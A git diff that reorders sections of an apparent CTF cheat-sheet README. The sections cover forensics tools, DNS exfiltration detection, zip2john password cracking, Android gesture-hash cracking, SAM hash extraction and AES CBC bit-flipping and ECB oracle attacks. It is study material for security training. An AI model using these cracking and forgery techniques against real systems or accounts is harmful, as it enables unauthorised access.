@@ -11,235 +11,27 @@ Most of the tools here are written in [Python](https://www.python.org/) and are 
 This file is auto generated using [build.py](build.py). To update it, update the README.md files in the subdirectories and run the build.py script.
 
 # Table of Contents
-* [Files](#files)
 * [Network](#network)
 * [Services and Ports](#services-and-ports)
 * [Reverse Engineering](#reverse-engineering)
 * [Binary Exploitation](#binary-exploitation)
+* [Files](#files)
 * [Forensics](#forensics)
 * [Cryptography](#cryptography)
+* [Web](#web)
 * [Pentest](#pentest)
+* [Jail Break](#jail-break)
 * [Steganography](#steganography)
 * [OSINT](#osint)
-* [Jail Break](#jail-break)
-* [Web](#web)
 * [Miscellaneous](#miscellaneous)
 * [Other Resources](#other-resources)
 
 <br><br>
 
-# Files
-
-⇨ [File Scanning](#file-scanning)<br>
-⇨ [Images](#images)<br>
-⇨ [PDF Files](#pdf-files)<br>
-⇨ [ZIP Files](#zip-files)<br>
-
-
-This section contains information about different file formats and their structure. It is always good to keep this in mind, especially for forensics investigations.
-
-## File Scanning
-
-
-
-File scanning is the process of analyzing a, potentially large, file to find information about it. This can be useful to find hidden data, or to simply find the data type and structure of a file.
-
-#### Tools
-
-* `file`
-
-    Deduce the file type from the headers.
-
-* `binwalk` <span style="color:red">❤️</span>
-
-    Look for embedded files in other files.
-
-    
-    ```bash
-    binwalk <file>            # List embedded files
-    binwalk -e <file>         # Extract embedded files
-    binwalk --dd=".*" <file>  # Extract all embedded files
-    ```
-    Alternatives: `foremost`, `hachoir-subfile`...
-
-* `strings`
-
-    Extract strings from a file.
-
-* `grep`
-
-    Search for a string, or regex, in a file.
-
-	```bash
-	grep <string> <file>          # Search in a file
-	grep -r <string> <directory>  # Search recursively in a directory
-	```
-
-* `hexdump`
-
-	Display the hexadecimal representation of a file.
-
-	```bash
-	hexdump -C <file>  # Dump bytes with address and ascii representation
-	hexdump <file>     # Dump bytes with address only
-	xxd -p <file>      # Dump only bytes
-	```
-
-* `yara` - [Website](https://virustotal.github.io/yara/)
-
-    Scan a file with Yara rules to find (malicious) patterns. rules can be found in the [Yara-Rules](https://github.com/Yara-Rules/rules) repository.
-
-    Here is an exemple rule to find a PNG file in a file:
-
-    png.yar
-    ```
-    rule is_png {
-        strings:
-            $png = { 89 50 4E 47 0D 0A 1A 0A }
-        condition:
-            $png
-    }
-    ```
-
-    ```bash
-    yara png.yar <file>  # Scan a file, outputs rule name if match
-    yara -s png.yar <file>  # Print the offset and the matched strings
-    ```
-
-#### File signatures
-
-* `file signatures` - [Wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures)
-
-    File signatures are bytes at the beginning of a file that identify the file type. This header is also called magic numbers.
-
-    Most files can be [found here](https://en.wikipedia.org/wiki/List_of_file_signatures), but the most common ones are :
-
-    | Hex signature | File type | Description |
-    | --- | --- | --- |
-    | `FF D8 FF` (???) | JPEG | [JPEG](https://en.wikipedia.org/wiki/JPEG) image |
-    | `89 50 4E 47 0D 0A 1A 0A` (?PNG) | PNG | [PNG](https://en.wikipedia.org/wiki/Portable_Network_Graphics) image |
-    | `50 4B` (PK) | ZIP | [ZIP](https://en.wikipedia.org/wiki/Zip_(file_format)) archive |
-
-    For exemple, the first 16 bytes of PNG are usually b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR'
-
-
-
-## Images
-
-
-
-* `pngcheck`
-
-	Check if a **PNG** file is valid. If it is not, displays the error.
-
-
-* `pngcsum` - [Website](http://www.schaik.com/png/pngcsum/pngcsum-v01.tar.gz)
-
-	Correct the CRCs present in a **PNG** file.
-
-
-* `PNG Check & Repair Tool` - [GitHub](https://github.com/sherlly/PCRT)
-
-	Correct a corrupted PNG file.
-
-	Utility to try and correct a **PNG** file. 
-
-	*Need to press enter to show the file.*
-
-
-* `Reading the specifications` <span style="color:red">❤️</span>
-
-	Reading the specification of image format are sometimes the only way to fix a corrupted image.
-
-	| File type | Summary | Full Specification |
-	| --- | --- | --- |
-	| PNG | [Summary](https://github.com/corkami/formats/blob/master/image/png.md) | [Full Specification](https://www.w3.org/TR/PNG/) |
-	| JPEG | [Summary](https://github.com/corkami/formats/blob/master/image/jpeg.md) | [Full Specification](https://www.w3.org/Graphics/JPEG/itu-t81.pdf) |
-
-#### Online tools
-
-* Repair image online tool
-
-    Good low-hanging fruit to throw any image at: [https://online.officerecovery.com/pixrecovery/](https://online.officerecovery.com/pixrecovery/)
-
-* [Analysis Image] ['https://29a.ch/photo-forensics/#forensic-magnifier']
-
-	Forensically is free online tool to analysis image this tool has many features like  Magnifier, Clone Detection, Error Level analysis, Noise Analysis, level Sweep, Meta Data, Geo tags, Thumbnail Analysis , JPEG Analysis, Strings Extraction.
-
-
-
-
-## PDF Files
-
-
-
-
-* `pdfinfo` - [Website](https://poppler.freedesktop.org/)
-
-	A command-line tool to get a basic synopsis of what the [PDF](https://en.wikipedia.org/wiki/Portable_Document_Format) file is.
-
-	```bash
-	# Extract all javascript from a PDF file
-	pdfinfo -js input.pdf
-	```
-
-* `pdf-parser` <span style="color:red">❤️</span> - [Website](https://blog.didierstevens.com/programs/pdf-tools/)
-
-	Parse a PDF file and extract the objects.
-
-	```bash
-	# Extract stream from object 77
-	python pdf-parser.py -o 77 -f -d out.txt input.pdf
-	```
-
-* `qpdf` - [GitHub](https://github\.com/qpdf/qpdf)
-
-	A command-line tool to manipulate [PDF](https://en.wikipedia.org/wiki/Portable_Document_Format) files. Can extract embedded files.
-
-* `pdfcrack` - [Website](https://pdfcrack.sourceforge.net/)
-
-	A command-line tool to recover a password from a PDF file. Supports dictionary, wordlists, and bruteforce.
-
-* `pdfimages` - [Website](https://poppler.freedesktop.org/)
-
-	A command-line tool, the first thing to reach for when given a PDF file. It extracts the images stored in a PDF file, but it needs the name of an output directory (that it will create for) to place the found images.
-
-* `pdfdetach` - [Website](https://www.systutorials.com/docs/linux/man/1-pdfdetach/)
-
-	A command-line tool to extract files out of a [PDF](https://en.wikipedia.org/wiki/Portable_Document_Format) file.
-
-
-
-## ZIP Files
-
-
-
-* `zip2john` <span style="color:red">❤️</span>
-
-    Brute force password protected zip files.
-
-    ``` bash
-    zip2john protected.zip > protected.john
-    john --wordlist=/usr/share/wordlists/rockyou.txt protected.john
-    ```
-
-* `bkcrack` - [GitHub](https://github\.com/kimci86/bkcrack)
-
-    Crack ZipCrypto Store files. Need some plaintext to work.
-
-* `Reading the specifications`
-
-	Reading the specification of image format are sometimes the only way to fix a corrupted ZIP. A summary of this specification can be found on [GitHub](https://github.com/corkami/formats/blob/master/archive/ZIP.md)
-
-
-
-
-<br><br>
-
 # Network
 
-⇨ [DNS Exfiltration](#dns-exfiltration)<br>
 ⇨ [Network Scanning](#network-scanning)<br>
+⇨ [DNS Exfiltration](#dns-exfiltration)<br>
 
 
 This section present some tools to analyse networks and network traffic. The `Services and Ports` section and the `Pentest` section can also be useful for network related tasks.
@@ -267,28 +59,6 @@ This section present some tools to analyse networks and network traffic. The `Se
 * `PcapXray` - [GitHub](https://github.com/Srinivas11789/PcapXray) 
 	A GUI tool to visualize network traffic.
 	
-
-
-
-## DNS Exfiltration
-
-
-
-DNS can be used to exfiltrate data, for example to bypass firewalls.
-
-* `iodine` - [GitHub](https://github.com/yarrick/iodine)
-
-    Can be identified by the presence of the "Aaahhh-Drink-mal-ein-Jägermeister" or "La flûte naïve française est retirée à Crête".<br>
-    Can be deciphered with [this script](Network/Tools/iodine/exploit.py)<br>
-    [Hack.lu CTF WU](http://blog.stalkr.net/2010/10/hacklu-ctf-challenge-9-bottle-writeup.html)
-
-* `DNScat2` - [GitHub](https://github.com/iagox86/dnscat2)
-
-    Can be identified when [file signatures](#file-scanning) are present in the DNS queries.
-    Data can be extracted with [this script](Network/Tools/dnscat2/exploit.py) and files can be extracted with [binwalk](#file-scanning).
-
-
-
 
 
 
@@ -349,6 +119,28 @@ DNS can be used to exfiltrate data, for example to bypass firewalls.
     # Passive scan
     netdiscover -p
     ```
+
+
+
+## DNS Exfiltration
+
+
+
+DNS can be used to exfiltrate data, for example to bypass firewalls.
+
+* `iodine` - [GitHub](https://github.com/yarrick/iodine)
+
+    Can be identified by the presence of the "Aaahhh-Drink-mal-ein-Jägermeister" or "La flûte naïve française est retirée à Crête".<br>
+    Can be deciphered with [this script](Network/Tools/iodine/exploit.py)<br>
+    [Hack.lu CTF WU](http://blog.stalkr.net/2010/10/hacklu-ctf-challenge-9-bottle-writeup.html)
+
+* `DNScat2` - [GitHub](https://github.com/iagox86/dnscat2)
+
+    Can be identified when [file signatures](#file-scanning) are present in the DNS queries.
+    Data can be extracted with [this script](Network/Tools/dnscat2/exploit.py) and files can be extracted with [binwalk](#file-scanning).
+
+
+
 
 
 <br><br>
@@ -576,10 +368,10 @@ RSYNC - 873/tcp
 
 # Reverse Engineering
 
-⇨ [Binaries](#binaries)<br>
 ⇨ [Python](#python)<br>
-⇨ [Android](#android)<br>
+⇨ [Binaries](#binaries)<br>
 ⇨ [Virtualization](#virtualization)<br>
+⇨ [Android](#android)<br>
 
 
 Reverse engineering is the process of analyzing a system, device or program in order to extract knowledge about it. It is a broad field that can be divided into two main categories: **static** and **dynamic** analysis.
@@ -598,6 +390,34 @@ The [Binary Exploitation](/Binary%20Exploitation) section, also known as PWN, is
 * GameBoy ROMS
 
 	Packages to run GameBoy ROMS: `visualboyadvance` or `retroarch`
+
+
+## Python
+
+
+
+
+* `Decompile .pyc files`
+
+	Several software can be used to decompile python bytecode.
+
+	| Software | Source | Notes |
+	| --- | --- | --- |
+	| `uncompyle6` | [GitHub](https://github\.com/rocky/python-uncompyle6/) | Decompiles Python bytecode to equivalent Python source code. Support python versions **up to to 3.8**. Legend has it that it exists an option (maybe -d) that can succeed when the regular decompilation fails. |
+	| `Decompyle++` <span style="color:red">❤️</span> | [GitHub](https://github.com/zrax/pycdc) | Less reliable, but can decompile every python3 versions. |
+	| `Easy Python Decompiler` | [Website](https://sourceforge.net/projects/easypythondecompiler/) | Windows GUI to decompile python bytecode. |
+
+
+* `Pyinstaller Extractor` - [GitHub](https://github.com/extremecoders-re/pyinstxtractor)
+
+	Extracts the python bytecode from pyinstaller windows executables. Can be decomplied  after.
+
+	```bash
+	python3 pyinstxtractor.py <filename>
+	```
+
+	An alternative is `pydumpck`
+
 
 
 ## Binaries
@@ -706,31 +526,11 @@ When the binary is stripped, the function's information is stored in the `.gopcl
 
 
 
-## Python
+## Virtualization
 
 
 
-
-* `Decompile .pyc files`
-
-	Several software can be used to decompile python bytecode.
-
-	| Software | Source | Notes |
-	| --- | --- | --- |
-	| `uncompyle6` | [GitHub](https://github\.com/rocky/python-uncompyle6/) | Decompiles Python bytecode to equivalent Python source code. Support python versions **up to to 3.8**. Legend has it that it exists an option (maybe -d) that can succeed when the regular decompilation fails. |
-	| `Decompyle++` <span style="color:red">❤️</span> | [GitHub](https://github.com/zrax/pycdc) | Less reliable, but can decompile every python3 versions. |
-	| `Easy Python Decompiler` | [Website](https://sourceforge.net/projects/easypythondecompiler/) | Windows GUI to decompile python bytecode. |
-
-
-* `Pyinstaller Extractor` - [GitHub](https://github.com/extremecoders-re/pyinstxtractor)
-
-	Extracts the python bytecode from pyinstaller windows executables. Can be decomplied  after.
-
-	```bash
-	python3 pyinstxtractor.py <filename>
-	```
-
-	An alternative is `pydumpck`
+In order to run some system, it is necessary to use virtualization.
 
 
 
@@ -768,14 +568,6 @@ When the binary is stripped, the function's information is stored in the `.gopcl
 
 	A GUI tool to decompile Java code, and JAR files.
 
-
-
-
-## Virtualization
-
-
-
-In order to run some system, it is necessary to use virtualization.
 
 
 <br><br>
@@ -934,14 +726,222 @@ Common tools to exploit binaries:
 
 <br><br>
 
+# Files
+
+⇨ [File Scanning](#file-scanning)<br>
+⇨ [Images](#images)<br>
+⇨ [PDF Files](#pdf-files)<br>
+⇨ [ZIP Files](#zip-files)<br>
+
+
+This section contains information about different file formats and their structure. It is always good to keep this in mind, especially for forensics investigations.
+
+## File Scanning
+
+
+
+File scanning is the process of analyzing a, potentially large, file to find information about it. This can be useful to find hidden data, or to simply find the data type and structure of a file.
+
+#### Tools
+
+* `file`
+
+    Deduce the file type from the headers.
+
+* `binwalk` <span style="color:red">❤️</span>
+
+    Look for embedded files in other files.
+
+    
+    ```bash
+    binwalk <file>            # List embedded files
+    binwalk -e <file>         # Extract embedded files
+    binwalk --dd=".*" <file>  # Extract all embedded files
+    ```
+    Alternatives: `foremost`, `hachoir-subfile`...
+
+* `strings`
+
+    Extract strings from a file.
+
+* `grep`
+
+    Search for a string, or regex, in a file.
+
+	```bash
+	grep <string> <file>          # Search in a file
+	grep -r <string> <directory>  # Search recursively in a directory
+	```
+
+* `hexdump`
+
+	Display the hexadecimal representation of a file.
+
+	```bash
+	hexdump -C <file>  # Dump bytes with address and ascii representation
+	hexdump <file>     # Dump bytes with address only
+	xxd -p <file>      # Dump only bytes
+	```
+
+* `yara` - [Website](https://virustotal.github.io/yara/)
+
+    Scan a file with Yara rules to find (malicious) patterns. rules can be found in the [Yara-Rules](https://github.com/Yara-Rules/rules) repository.
+
+    Here is an exemple rule to find a PNG file in a file:
+
+    png.yar
+    ```
+    rule is_png {
+        strings:
+            $png = { 89 50 4E 47 0D 0A 1A 0A }
+        condition:
+            $png
+    }
+    ```
+
+    ```bash
+    yara png.yar <file>  # Scan a file, outputs rule name if match
+    yara -s png.yar <file>  # Print the offset and the matched strings
+    ```
+
+#### File signatures
+
+* `file signatures` - [Wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures)
+
+    File signatures are bytes at the beginning of a file that identify the file type. This header is also called magic numbers.
+
+    Most files can be [found here](https://en.wikipedia.org/wiki/List_of_file_signatures), but the most common ones are :
+
+    | Hex signature | File type | Description |
+    | --- | --- | --- |
+    | `FF D8 FF` (???) | JPEG | [JPEG](https://en.wikipedia.org/wiki/JPEG) image |
+    | `89 50 4E 47 0D 0A 1A 0A` (?PNG) | PNG | [PNG](https://en.wikipedia.org/wiki/Portable_Network_Graphics) image |
+    | `50 4B` (PK) | ZIP | [ZIP](https://en.wikipedia.org/wiki/Zip_(file_format)) archive |
+
+    For exemple, the first 16 bytes of PNG are usually b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR'
+
+
+
+## Images
+
+
+
+* `pngcheck`
+
+	Check if a **PNG** file is valid. If it is not, displays the error.
+
+
+* `pngcsum` - [Website](http://www.schaik.com/png/pngcsum/pngcsum-v01.tar.gz)
+
+	Correct the CRCs present in a **PNG** file.
+
+
+* `PNG Check & Repair Tool` - [GitHub](https://github.com/sherlly/PCRT)
+
+	Correct a corrupted PNG file.
+
+	Utility to try and correct a **PNG** file. 
+
+	*Need to press enter to show the file.*
+
+
+* `Reading the specifications` <span style="color:red">❤️</span>
+
+	Reading the specification of image format are sometimes the only way to fix a corrupted image.
+
+	| File type | Summary | Full Specification |
+	| --- | --- | --- |
+	| PNG | [Summary](https://github.com/corkami/formats/blob/master/image/png.md) | [Full Specification](https://www.w3.org/TR/PNG/) |
+	| JPEG | [Summary](https://github.com/corkami/formats/blob/master/image/jpeg.md) | [Full Specification](https://www.w3.org/Graphics/JPEG/itu-t81.pdf) |
+
+#### Online tools
+
+* Repair image online tool
+
+    Good low-hanging fruit to throw any image at: [https://online.officerecovery.com/pixrecovery/](https://online.officerecovery.com/pixrecovery/)
+
+* [Analysis Image] ['https://29a.ch/photo-forensics/#forensic-magnifier']
+
+	Forensically is free online tool to analysis image this tool has many features like  Magnifier, Clone Detection, Error Level analysis, Noise Analysis, level Sweep, Meta Data, Geo tags, Thumbnail Analysis , JPEG Analysis, Strings Extraction.
+
+
+
+
+## PDF Files
+
+
+
+
+* `pdfinfo` - [Website](https://poppler.freedesktop.org/)
+
+	A command-line tool to get a basic synopsis of what the [PDF](https://en.wikipedia.org/wiki/Portable_Document_Format) file is.
+
+	```bash
+	# Extract all javascript from a PDF file
+	pdfinfo -js input.pdf
+	```
+
+* `pdf-parser` <span style="color:red">❤️</span> - [Website](https://blog.didierstevens.com/programs/pdf-tools/)
+
+	Parse a PDF file and extract the objects.
+
+	```bash
+	# Extract stream from object 77
+	python pdf-parser.py -o 77 -f -d out.txt input.pdf
+	```
+
+* `qpdf` - [GitHub](https://github\.com/qpdf/qpdf)
+
+	A command-line tool to manipulate [PDF](https://en.wikipedia.org/wiki/Portable_Document_Format) files. Can extract embedded files.
+
+* `pdfcrack` - [Website](https://pdfcrack.sourceforge.net/)
+
+	A command-line tool to recover a password from a PDF file. Supports dictionary, wordlists, and bruteforce.
+
+* `pdfimages` - [Website](https://poppler.freedesktop.org/)
+
+	A command-line tool, the first thing to reach for when given a PDF file. It extracts the images stored in a PDF file, but it needs the name of an output directory (that it will create for) to place the found images.
+
+* `pdfdetach` - [Website](https://www.systutorials.com/docs/linux/man/1-pdfdetach/)
+
+	A command-line tool to extract files out of a [PDF](https://en.wikipedia.org/wiki/Portable_Document_Format) file.
+
+
+
+## ZIP Files
+
+
+
+* `zip2john` <span style="color:red">❤️</span>
+
+    Brute force password protected zip files.
+
+    ``` bash
+    zip2john protected.zip > protected.john
+    john --wordlist=/usr/share/wordlists/rockyou.txt protected.john
+    ```
+
+* `bkcrack` - [GitHub](https://github\.com/kimci86/bkcrack)
+
+    Crack ZipCrypto Store files. Need some plaintext to work.
+
+* `Reading the specifications`
+
+	Reading the specification of image format are sometimes the only way to fix a corrupted ZIP. A summary of this specification can be found on [GitHub](https://github.com/corkami/formats/blob/master/archive/ZIP.md)
+
+
+
+
+<br><br>
+
 # Forensics
 
+⇨ [Disk Image](#disk-image)<br>
 ⇨ [Logs](#logs)<br>
 ⇨ [Browser Forensics](#browser-forensics)<br>
+⇨ [Memory Dump](#memory-dump)<br>
 ⇨ [Android Forensics](#android-forensics)<br>
 ⇨ [Docker](#docker)<br>
-⇨ [Disk Image](#disk-image)<br>
-⇨ [Memory Dump](#memory-dump)<br>
 
 
 
@@ -979,6 +979,53 @@ Common tools to exploit binaries:
 	Windows stores information about the programs that are run in a prefetch file. This information can be used to determine what programs were run on a system. The prefetch files are stored in `C:\Windows\Prefetch\` and have the extension `.pf`. 
 	
 	It can be parsed using `PECmd` from [Eric Zimmerman's tools](https://ericzimmerman.github.io/#!index.md). Win10 prefetch files can only be parsed on Win8+ systems, wine will not work for this.
+
+## Disk Image
+
+
+
+#### Tools
+
+* `Autopsy` <span style="color:red">❤️</span> - [Website](https://www.autopsy.com/download/)
+
+    GUI for analyzing disk images with Sleuthkit. It can be used to extract files, search for keywords, etc...
+
+* [`mount`]
+
+    Mount a disk image to a filesystem.
+    
+    I recommend to use a virtual machine to mount the disk image. This way you can browse the filesystem and extract files without risking to damage your system.
+
+* `TestDisk` - [Website](https://www.cgsecurity.org/Download_and_donate.php/testdisk-7.1-WIP.linux26.tar.bz2) 
+	
+    CLI tool to recover lost partitions and/or make non-booting disks bootable again.
+
+* `photorec` - [Website](https://www.cgsecurity.org/wiki/PhotoRec) 
+	
+    CLI tool to recover deleted files. Works with raw data, so the disk do not need to have a partition system working.
+
+#### Techniques
+
+* Extract windows hashes from filesystem (SAM file).
+
+    This can be done with `samdump2`. See this [GitHub repository](https://github.com/noraj/the-hacking-trove/blob/master/docs/Tools/extract_windows_hashes.md) for more information.
+
+
+#### Data formats
+
+* `WIM` : Windows Imaging Format - [Wikipedia](https://en.wikipedia.org/wiki/Windows_Imaging_Format)
+
+    WIM is a file format used for windows disk images. Data can be extracted on linux using `wimlib`.
+
+	```bash
+	wiminfo <file.wim> # List all images in the wim file
+	wimapply <file.wim> <image_index> <output_directory> # Extract an image from the wim file
+	``` 
+
+
+
+
+
 
 ## Logs
 
@@ -1128,75 +1175,6 @@ Firefox based browsers (and Thunderbird) store their profiles in the following f
 
 
 
-## Android Forensics
-
-
-
-* `Gesture cracking`
-
-    The gesture needed to unlock the phone is stored in `/data/system/gesture.key` as a SHA1 hash of the gesture. [This python script](Forensics/Tools/gesture_cracker.py) or [this C program](Forensics/Tools/gesture_cracker.c) can be used to crack the gesture, .
-
-
-
-## Docker
-
-
-
-* `Dive` - [GitHub](https://github.com/wagoodman/dive)
-
-    Explore layers of a docker image.
-
-    If a interesting file modification is found, it can be extracted from the image with an archive editing software (or with `dive export <image> <layer> <file> <output>` ?).
-
-
-
-## Disk Image
-
-
-
-#### Tools
-
-* `Autopsy` <span style="color:red">❤️</span> - [Website](https://www.autopsy.com/download/)
-
-    GUI for analyzing disk images with Sleuthkit. It can be used to extract files, search for keywords, etc...
-
-* [`mount`]
-
-    Mount a disk image to a filesystem.
-    
-    I recommend to use a virtual machine to mount the disk image. This way you can browse the filesystem and extract files without risking to damage your system.
-
-* `TestDisk` - [Website](https://www.cgsecurity.org/Download_and_donate.php/testdisk-7.1-WIP.linux26.tar.bz2) 
-	
-    CLI tool to recover lost partitions and/or make non-booting disks bootable again.
-
-* `photorec` - [Website](https://www.cgsecurity.org/wiki/PhotoRec) 
-	
-    CLI tool to recover deleted files. Works with raw data, so the disk do not need to have a partition system working.
-
-#### Techniques
-
-* Extract windows hashes from filesystem (SAM file).
-
-    This can be done with `samdump2`. See this [GitHub repository](https://github.com/noraj/the-hacking-trove/blob/master/docs/Tools/extract_windows_hashes.md) for more information.
-
-
-#### Data formats
-
-* `WIM` : Windows Imaging Format - [Wikipedia](https://en.wikipedia.org/wiki/Windows_Imaging_Format)
-
-    WIM is a file format used for windows disk images. Data can be extracted on linux using `wimlib`.
-
-	```bash
-	wiminfo <file.wim> # List all images in the wim file
-	wimapply <file.wim> <image_index> <output_directory> # Extract an image from the wim file
-	``` 
-
-
-
-
-
-
 ## Memory Dump
 
 
@@ -1329,6 +1307,28 @@ The full documentation can be found [here](https://volatility3.readthedocs.io)
 
 
 
+
+
+
+## Android Forensics
+
+
+
+* `Gesture cracking`
+
+    The gesture needed to unlock the phone is stored in `/data/system/gesture.key` as a SHA1 hash of the gesture. [This python script](Forensics/Tools/gesture_cracker.py) or [this C program](Forensics/Tools/gesture_cracker.c) can be used to crack the gesture, .
+
+
+
+## Docker
+
+
+
+* `Dive` - [GitHub](https://github.com/wagoodman/dive)
+
+    Explore layers of a docker image.
+
+    If a interesting file modification is found, it can be extracted from the image with an archive editing software (or with `dive export <image> <layer> <file> <output>` ?).
 
 
 <br><br>
@@ -1562,10 +1562,10 @@ Several attacks exist on RSA depending on the circumstances.
 
 ## AES
 
+⇨ [AES - CBC Mode](#aes---cbc-mode)<br>
+⇨ [AES - ECB Mode](#aes---ecb-mode)<br>
 ⇨ [AES - OFB Mode](#aes---ofb-mode)<br>
 ⇨ [AES - CTR Mode](#aes---ctr-mode)<br>
-⇨ [AES - ECB Mode](#aes---ecb-mode)<br>
-⇨ [AES - CBC Mode](#aes---cbc-mode)<br>
 ⇨ [AES - GCM Mode](#aes---gcm-mode)<br>
 
 
@@ -1613,6 +1613,64 @@ The most common block operation modes are:
 
 	[CryptoHack](https://cryptohack.org/challenges/beatboxer/solutions/) - CryptoHack challenge with an affine sbox and only one message.
 
+### AES - CBC Mode
+
+
+
+[AES Cipher Block Chaining](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_block_chaining_(CBC)) is the most commonly used mode of operation. It uses the previous output to xor the next input.
+
+##### Definition
+
+![CBC Encryption](Cryptography/AES/AES%20-%20CBC%20Mode/_img/CBC_encryption.png#gh-light-mode-only)
+![CBC Encryption](Cryptography/AES/AES%20-%20CBC%20Mode/_img/CBC_encryption-dark.png#gh-dark-mode-only)
+![CBC Decryption](Cryptography/AES/AES%20-%20CBC%20Mode/_img/CBC_decryption.png#gh-light-mode-only)
+![CBC Decryption](Cryptography/AES/AES%20-%20CBC%20Mode/_img/CBC_decryption-dark.png#gh-dark-mode-only)
+
+##### Attacks
+
+* Bit flipping attack (CPA) - [Wikipedia](https://en.wikipedia.org/wiki/Bit-flipping_attack) [CryptoHack](https://cryptohack.org/courses/symmetric/flipping_cookie/)
+
+    If an attacker can change the ciphertext, they can also alter the plaintext because of the XOR operation in the decryption process. (Homomorphic property of XOR, used in the previous block)
+    
+    **If you want to change the first block of plaintext**, you need to be able to edit the IV, as the first block of plaintext is XORed with the IV. If you don't have access to it, you can try to make the target system ignore the first block and edit the remainder instead. (example: json cookie {admin=False;randomstuff=whatever} -> {admin=False;rando;admin=True} )
+
+    [Custom exploit script](Cryptography/AES/AES%20-%20CBC%20Mode/Tools/bit-flipping-cbc.py) from this [Github gist](https://gist.github.com/nil0x42/8bb48b337d64971fb296b8b9b6e89a0d)
+
+    [Video explanation](https://www.youtube.com/watch?v=QG-z0r9afIs)
+
+
+* IV = Key - [StackExchange](https://crypto.stackexchange.com/questions/16161/problems-with-using-aes-key-as-iv-in-cbc-mode) [CryptoHack](https://aes.cryptohack.org/lazy_cbc/)
+
+    When the IV is chosen as the key, AES becomes insecure. The Key can be leaked if you have a decryption oracle (CCA).
+
+
+
+### AES - ECB Mode
+
+
+
+[AES Electronic CodeBook](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Electronic_codebook_(ECB)) is the most basic mode of operation. Each block is encrypted independently of the others.  This is considered **unsecure** for most applications.
+
+##### Definition
+
+![ECB Encryption](Cryptography/AES/AES%20-%20ECB%20Mode/_img/601px-ECB_encryption.png#gh-light-mode-only)
+![ECB Encryption](Cryptography/AES/AES%20-%20ECB%20Mode/_img/601px-ECB_encryption-dark.png#gh-dark-mode-only)
+![ECB Decryption](Cryptography/AES/AES%20-%20ECB%20Mode/_img/601px-ECB_decryption.png#gh-light-mode-only)
+![ECB Decryption](Cryptography/AES/AES%20-%20ECB%20Mode/_img/601px-ECB_decryption-dark.png#gh-dark-mode-only)
+
+##### Attacks
+
+* ECB Encryption Oracle padded with secret - [CryptoHack](https://cryptohack.org/courses/symmetric/ecb_oracle/)
+
+	To leak the secret, we can use the fact that ECB mode is stateless. We can compare the output of a block containing one unknown byte of the secret with all 256 possible outputs. The block that encrypts to the correct output is the one that contains the unknown byte.
+
+* ECB Decryption Oracle - [CryptoHack](https://cryptohack.org/courses/symmetric/ecbcbcwtf/)
+
+	A ECB decryption oracle can simply be used as an AES block decoder. Many modes can be compromised by this oracle.
+	
+
+
+
 ### AES - OFB Mode
 
 
@@ -1643,64 +1701,6 @@ The main problem with this mode is that the nonce must be unique for each messag
 ![CTR Decryption](Cryptography/AES/AES%20-%20CTR%20Mode/_img/601px-CTR_decryption_2.png#gh-light-mode-only)
 ![CTR Decryption](Cryptography/AES/AES%20-%20CTR%20Mode/_img/601px-CTR_decryption_2-dark.png#gh-dark-mode-only)
 
-
-
-
-### AES - ECB Mode
-
-
-
-[AES Electronic CodeBook](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Electronic_codebook_(ECB)) is the most basic mode of operation. Each block is encrypted independently of the others.  This is considered **unsecure** for most applications.
-
-##### Definition
-
-![ECB Encryption](Cryptography/AES/AES%20-%20ECB%20Mode/_img/601px-ECB_encryption.png#gh-light-mode-only)
-![ECB Encryption](Cryptography/AES/AES%20-%20ECB%20Mode/_img/601px-ECB_encryption-dark.png#gh-dark-mode-only)
-![ECB Decryption](Cryptography/AES/AES%20-%20ECB%20Mode/_img/601px-ECB_decryption.png#gh-light-mode-only)
-![ECB Decryption](Cryptography/AES/AES%20-%20ECB%20Mode/_img/601px-ECB_decryption-dark.png#gh-dark-mode-only)
-
-##### Attacks
-
-* ECB Encryption Oracle padded with secret - [CryptoHack](https://cryptohack.org/courses/symmetric/ecb_oracle/)
-
-	To leak the secret, we can use the fact that ECB mode is stateless. We can compare the output of a block containing one unknown byte of the secret with all 256 possible outputs. The block that encrypts to the correct output is the one that contains the unknown byte.
-
-* ECB Decryption Oracle - [CryptoHack](https://cryptohack.org/courses/symmetric/ecbcbcwtf/)
-
-	A ECB decryption oracle can simply be used as an AES block decoder. Many modes can be compromised by this oracle.
-	
-
-
-
-### AES - CBC Mode
-
-
-
-[AES Cipher Block Chaining](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_block_chaining_(CBC)) is the most commonly used mode of operation. It uses the previous output to xor the next input.
-
-##### Definition
-
-![CBC Encryption](Cryptography/AES/AES%20-%20CBC%20Mode/_img/CBC_encryption.png#gh-light-mode-only)
-![CBC Encryption](Cryptography/AES/AES%20-%20CBC%20Mode/_img/CBC_encryption-dark.png#gh-dark-mode-only)
-![CBC Decryption](Cryptography/AES/AES%20-%20CBC%20Mode/_img/CBC_decryption.png#gh-light-mode-only)
-![CBC Decryption](Cryptography/AES/AES%20-%20CBC%20Mode/_img/CBC_decryption-dark.png#gh-dark-mode-only)
-
-##### Attacks
-
-* Bit flipping attack (CPA) - [Wikipedia](https://en.wikipedia.org/wiki/Bit-flipping_attack) [CryptoHack](https://cryptohack.org/courses/symmetric/flipping_cookie/)
-
-    If an attacker can change the ciphertext, they can also alter the plaintext because of the XOR operation in the decryption process. (Homomorphic property of XOR, used in the previous block)
-    
-    **If you want to change the first block of plaintext**, you need to be able to edit the IV, as the first block of plaintext is XORed with the IV. If you don't have access to it, you can try to make the target system ignore the first block and edit the remainder instead. (example: json cookie {admin=False;randomstuff=whatever} -> {admin=False;rando;admin=True} )
-
-    [Custom exploit script](Cryptography/AES/AES%20-%20CBC%20Mode/Tools/bit-flipping-cbc.py) from this [Github gist](https://gist.github.com/nil0x42/8bb48b337d64971fb296b8b9b6e89a0d)
-
-    [Video explanation](https://www.youtube.com/watch?v=QG-z0r9afIs)
-
-
-* IV = Key - [StackExchange](https://crypto.stackexchange.com/questions/16161/problems-with-using-aes-key-as-iv-in-cbc-mode) [CryptoHack](https://aes.cryptohack.org/lazy_cbc/)
-
-    When the IV is chosen as the key, AES becomes insecure. The Key can be leaked if you have a decryption oracle (CCA).
 
 
 
@@ -2081,683 +2081,6 @@ Substitution ciphers are ciphers where each letter is replaced by another letter
 
 <br><br>
 
-# Pentest
-
